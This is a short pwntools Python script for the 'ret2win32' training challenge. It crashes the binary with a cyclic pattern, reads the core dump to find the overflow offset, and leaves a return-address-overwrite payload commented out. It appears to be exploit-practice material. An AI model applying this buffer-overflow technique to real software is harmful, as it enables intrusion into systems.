#!/usr/bin/python
from pwn import *

# setup pwntools
elf = context.binary = ELF('ret2win32')

# get base address
info("%#x <-- base address" % elf.address)

io = process(elf.path)
io.sendline(cyclic(50))
io.wait()

core = io.corefile
stack = core.esp
info("%#x stack", stack)

pattern = core.read(stack,4)
info("%r pattern", pattern)


#payload = fit({
#	pattern: elf.symbols.ret2win
#})

